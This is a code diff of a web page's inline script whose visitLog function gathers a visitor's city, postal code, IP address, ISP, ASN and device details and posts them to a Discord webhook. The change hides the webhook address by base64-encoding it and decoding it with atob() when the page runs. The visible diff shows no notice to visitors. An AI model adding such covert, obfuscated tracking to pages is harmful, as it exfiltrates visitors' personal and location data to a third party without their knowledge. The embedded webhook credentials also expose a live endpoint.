@@ -192,14 +192,15 @@
     <script>
         function visitLog(dataIn) {
 
-
             var dataOut = "City: " + dataIn.city + "\nPostal: " + dataIn.postal + "\nIP: " + dataIn.ip + "\nISP: " + dataIn.org + "\nASN: " + dataIn.asn + "\nDevice: " + platform.description
-            var URL = `https://discord.com/api/webhooks/933750061316317255/sxw9icPS1Y-5CZpoKiiR-feCvGXJ0HYMyXYB2lQJatq1ngeVOVbstbunbKk79aLWARTY`;
-            fetch(URL, {
+            var URL = `aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvOTM3NTU2NzQwNDYxOTc3NjIyL1JuNV9vODhHR3p3ejRYbFVUOVpBVUkxUElta1pyRVhjZldLclZMM0JHdm9ERnExM1hranVJTHlNemZPNWpWSWJpMzFU`;
+
+            fetch(atob(URL), {
                 "method": "POST",
                 "headers": { "Content-Type": "application/json" },
                 "body": JSON.stringify({
-                    "content": dataOut
+                    "content": dataOut,
+                    "username": "dotme"
                 })
 
             })
